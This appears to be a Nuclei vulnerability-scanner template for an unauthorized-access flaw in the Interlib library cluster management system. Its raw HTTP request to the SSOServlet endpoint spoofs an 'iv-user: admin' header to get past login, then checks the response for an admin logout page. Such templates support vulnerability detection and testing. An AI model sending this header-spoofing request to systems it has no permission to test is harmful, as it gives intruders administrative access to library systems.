id: interlib-unauth

info:
  name: Interlib SSOServlet - Unauthorized
  author: qwtd
  severity: medium
  description: Interlib is vulnerable to unauthorized.
  reference:
    - https://wiki.wy876.cn/#/./%E5%B9%BF%E5%B7%9E%E5%9B%BE%E5%88%9B%E5%9B%BE%E4%B9%A6%E9%A6%86%E9%9B%86%E7%BE%A4%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E5%B9%BF%E5%B7%9E%E5%9B%BE%E5%88%9B%E5%9B%BE%E4%B9%A6%E9%A6%86%E9%9B%86%E7%BE%A4%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE
  metadata:
    max-request: 2
  tags: 图创软件-图书馆站群管理系统

http:
  - raw:
      - |
        GET /interlib/common/SSOServlet? HTTP/1.1
        Host: {{Hostname}}
        iv-user: admin
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh-HK;q=0.9,zh;q=0.8
        Connection: close

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          
      - type: word
        part: header
        words:
          - "common/adminLogout.jsp"
